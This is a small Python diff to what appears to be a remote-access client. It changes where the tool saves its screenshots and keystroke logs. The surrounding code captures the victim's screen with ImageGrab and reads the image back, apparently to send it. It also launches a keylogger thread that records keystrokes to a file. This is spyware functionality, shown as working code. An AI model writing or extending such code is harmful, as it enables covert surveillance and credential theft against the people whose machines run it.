@@ -49,8 +49,8 @@ class Client:
                     print "i don't know that command"
 
     def screenshot(self,pkt):
-        ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.png", "png")
-        f = open('C:\Users\matt\Desktop\scrnsht.png', 'rb')
+        ImageGrab.grab().save("C:\scrnsht.png", "png")
+        f = open('C:\scrnsht.png', 'rb')
         fread = f.read()
         f.close()
         state = "143"
@@ -65,7 +65,7 @@ class Client:
 
     def keylog(self,pkt):
         import shutil
-        path = "C:\Users\Matt\Desktop\keylogs.txt"
+        path = "C:\keylogs.txt"
         kl = keylog.keyLogger(path)
         threading.Thread(target=kl.run).start()
         for i in range(0,1440):
